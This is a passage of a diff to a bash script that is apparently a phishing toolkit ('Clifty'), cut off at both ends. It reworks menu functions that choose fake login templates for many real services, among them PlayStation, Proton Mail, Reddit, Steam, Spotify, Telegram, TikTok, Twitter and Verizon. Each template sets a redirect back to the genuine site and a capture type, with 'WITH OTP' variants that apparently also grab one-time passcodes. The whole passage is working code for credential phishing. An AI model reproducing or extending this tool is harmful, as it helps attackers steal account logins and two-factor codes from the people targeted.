+        capture_type="OOTP"
+        site_template="Default"
 }
 #origin
-site_pinterest(){
-website="pinterest"
-rdurl="pinterest.com/"
-siname="Pinterest"
-dgfname="pinterest"
-sitype="Default"
-tunnelmenu
+login_pinterest(){
+        site_id="pinterest"
+        rdurl="pinterest.com/"
+        site_name="Pinterest"
+        dgfname="pinterest"
+        capture_type="NOTP"
+        site_template="Default"
 }
 #playstation
-site_playstation(){
-siname="PlayStation"
-rdurl="www.playstation.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_playstation(){
+        site_name="PlayStation"
+        rdurl="www.playstation.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="playstation"
-                sitype="Default"
-                dgfname="playstation"
-                tunnelmenu;;
-        2 | 02)
-                website="playstation/otp"
-                sitype="OTP"
-                dgfname="playstation"
-                tunnelmenu;;
-        3 | 03)
-                website="playstation2"
-                sitype="2"
-                dgfname="playstation2"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_playstation; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="playstation"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="playstation" ;;
+                2 | 02)
+                        site_id="playstation/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="playstation" ;;
+                3 | 03)
+                        site_id="playstation2"
+                        capture_type="NOTP"
+                        site_template="2"
+                        dgfname="playstation2" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_playstation; };;
+        esac
 }
 #protonmail
-site_protonmail(){
-siname="Proton Mail"
-dgfname="protonmail"
-rdurl="proton.me/"
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_protonmail(){
+        site_name="Proton Mail"
+        dgfname="protonmail"
+        rdurl="proton.me/"
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="protonmail"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="protonmail/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_protonmail; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="protonmail"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="protonmail/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_protonmail; };;
+        esac
 }
 #pubg
-site_pubg(){
-website="pubg"
-rdurl="www.pubgmobile.com/"
-siname="PUBG"
-dgfname="pubg"
-sitype="Old"
-tunnelmenu
+login_pubg(){
+        site_id="pubg"
+        rdurl="www.pubgmobile.com/"
+        site_name="PUBG"
+        dgfname="pubg"
+        capture_type="NOTP"
+        site_template="Old"
 }
 #quora
-site_quora(){
-website="quora"
-dgfname="quora"
-rdurl="www.quora.com/"
-siname="Quora"
-sitype="Default"
-tunnelmenu
+login_quora(){
+        site_id="quora"
+        dgfname="quora"
+        rdurl="www.quora.com/"
+        site_name="Quora"
+        capture_type="NOTP"
+        site_template="Default"
 }
 #reddit
-site_reddit(){
-siname="Reddit"
-rdurl="www.reddit.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
-echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_reddit(){
+        site_name="Reddit"
+        rdurl="www.reddit.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="reddit"
-                sitype="Default"
-                dgfname="reddit"
-                tunnelmenu;;
-        2 | 02)
-                website="reddit_old"
-                sitype="Old"
-                dgfname="reddit_old"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_reddit; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="reddit"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="reddit" ;;
+                2 | 02)
+                        site_id="reddit_old"
+                        capture_type="NOTP"
+                        site_template="Old"
+                        dgfname="reddit_old" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_reddit; };;
+        esac
 }
 #shopify
-site_shopify(){
-siname="Shopify"
-dgfname="shopify"
-rdurl="www.shopify.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_shopify(){
+        site_name="Shopify"
+        dgfname="shopify"
+        rdurl="www.shopify.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="shopify"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="shopify/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_shopify; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="shopify"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="shopify/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_shopify; };;
+        esac
 }
 #snapchat
-site_snapchat(){
-siname="Snapchat"
-dgfname="snapchat"
-rdurl="www.snapchat.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_snapchat(){
+        site_name="Snapchat"
+        dgfname="snapchat"
+        rdurl="www.snapchat.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="snapchat"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="snapchat/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_snapchat; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="snapchat"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="snapchat/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_snapchat; };;
+        esac
 }
 #socialclub
-site_socialclub(){
-siname="SocialClub"
-dgfname="socialclub"
-rdurl="socialclub.rockstargames.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_socialclub(){
+        site_name="SocialClub"
+        dgfname="socialclub"
+        rdurl="socialclub.rockstargames.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="socialclub"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="socialclub/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_socialclub; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="socialclub"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="socialclub/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_socialclub; };;
+        esac
 }
 #spotify
-site_spotify(){
-siname="Spotify"
-dgfname="spotify"
-rdurl="www.spotify.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_spotify(){
+        site_name="Spotify"
+        dgfname="spotify"
+        rdurl="www.spotify.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="spotify"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="spotify/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_spotify; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="spotify"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="spotify/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_spotify; };;
+        esac
 }
 #stackoverflow
-site_stackoverflow(){
-siname="Stackoverflow"
-dgfname="stackoverflow"
-rdurl="stackoverflow.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_stackoverflow(){
+        site_name="Stackoverflow"
+        dgfname="stackoverflow"
+        rdurl="stackoverflow.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="stackoverflow"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="stackoverflow/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_stackoverflow; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="stackoverflow"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="stackoverflow/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_stackoverflow; };;
+        esac
 }
 #steam
-site_steam(){
-siname="Steam"
-dgfname="steam"
-rdurl="store.steampowered.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_steam(){
+        site_name="Steam"
+        dgfname="steam"
+        rdurl="store.steampowered.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="steam"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="steam/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_steam; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="steam"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="steam/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_steam; };;
+        esac
 }
 #subitoit
-site_subitoit(){
-website="subitoit"
-rdurl="www.subito.it/"
-siname="Subitoit"
-dgfname="subitoit"
-sitype="Default"
-tunnelmenu
+login_subitoit(){
+        site_id="subitoit"
+        rdurl="www.subito.it/"
+        site_name="Subitoit"
+        dgfname="subitoit"
+        capture_type="NOTP"
+        site_template="Default"
 }
 #telegram
-site_telegram(){
-website="telegram"
-rdurl="telegram.org/"
-siname="Telegram"
-dgfname="telegram"
-sitype="Default"
-tunnelmenu
+login_telegram(){
+        site_id="telegram"
+        rdurl="telegram.org/"
+        site_name="Telegram"
+        dgfname="telegram"
+        capture_type="OOTP"
+        site_template="Default"
 }
 #telenor
-site_telenor(){
-website="telenor"
-rdurl="www.telenor.com/"
-siname="Telenor"
-dgfname="telenor"
-sitype="Default"
-tunnelmenu
+login_telenor(){
+        site_id="telenor"
+        rdurl="www.telenor.com/"
+        site_name="Telenor"
+        dgfname="telenor"
+        capture_type="OOTP"
+        site_template="Default"
 }
 #tiktok
-site_tiktok(){
-siname="TikTok"
-rdurl="www.tiktok.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_tiktok(){
+        site_name="TikTok"
+        rdurl="www.tiktok.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="tiktok"
-                sitype="Default"
-                dgfname="tiktok"
-                tunnelmenu;;
-        2 | 02)
-                website="tiktok_likes"
-                sitype="Likes"
-                dgfname="tiktok_likes"
-                tunnelmenu;;
-        3 | 03)
-                website="tiktok_likes/otp"
-                sitype="Likes/OTP"
-                dgfname="tiktok_likes"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_tiktok; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="tiktok"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="tiktok" ;;
+                2 | 02)
+                        site_id="tiktok_likes"
+                        capture_type="NOTP"
+                        site_template="Likes"
+                        dgfname="tiktok_likes" ;;
+                3 | 03)
+                        site_id="tiktok_likes/otp"
+                        capture_type="POTP"
+                        site_template="Likes/OTP"
+                        dgfname="tiktok_likes" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                                { sleep 1; banner; login_tiktok; };;
+        esac
 }
 #twitch
-site_twitch(){
-siname="Twitch"
-rdurl="www.twitch.tv/"
-echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_twitch(){
+        site_name="Twitch"
+        rdurl="www.twitch.tv/"
+        echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="twitch"
-                sitype="Default"
-                dgfname="twitch"
-                tunnelmenu;;
-        2 | 02)
-                website="twitch/otp"
-                sitype="OTP"
-                dgfname="twitch"
-                tunnelmenu;;
-        3 | 03)
-                website="twitch_new"
-                sitype="New"
-                dgfname="twitch_new"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_twitch; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="twitch"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="twitch" ;;
+                2 | 02)
+                        site_id="twitch/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="twitch" ;;
+                3 | 03)
+                        site_id="twitch_new"
+                        capture_type="NOTP"
+                        site_template="New"
+                        dgfname="twitch_new" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_twitch; };;
+        esac
 }
 #twitter
-site_twitter(){
-siname="Twitter"
-dgfname="twitter"
-rdurl="twitter.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_twitter(){
+        site_name="Twitter"
+        dgfname="twitter"
+        rdurl="twitter.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="twitter"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="twitter/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_twitter; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="twitter"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="twitter/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_twitter; };;
+        esac
 }
 #ubereats
-site_ubereats(){
-siname="ubereats"
-dgfname="ubereats"
-rdurl="www.ubereats.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_ubereats(){
+        site_name="ubereats"
+        dgfname="ubereats"
+        rdurl="www.ubereats.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="ubereats"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="ubereats/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_ubereats; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="ubereats"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="ubereats/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_ubereats; };;
+        esac
 }
 #verizon
-site_verizon(){
-siname="Verizon"
-dgfname="verizon"
-rdurl="www.verizon.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
